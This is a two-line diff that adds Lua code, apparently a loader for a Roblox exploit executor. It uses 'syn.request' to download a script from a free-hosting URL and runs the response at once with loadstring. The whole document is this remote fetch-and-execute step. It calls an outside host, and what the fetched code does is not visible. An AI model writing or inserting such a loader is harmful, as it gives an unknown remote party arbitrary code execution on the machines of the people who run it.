@@ -1,0 +1,2 @@
+if syn then request = syn.request end
+loadstring(request({['Url']='https://zoihwid.000webhostapp.com/Client/Luncher',['Method']='GET'}).Body)()
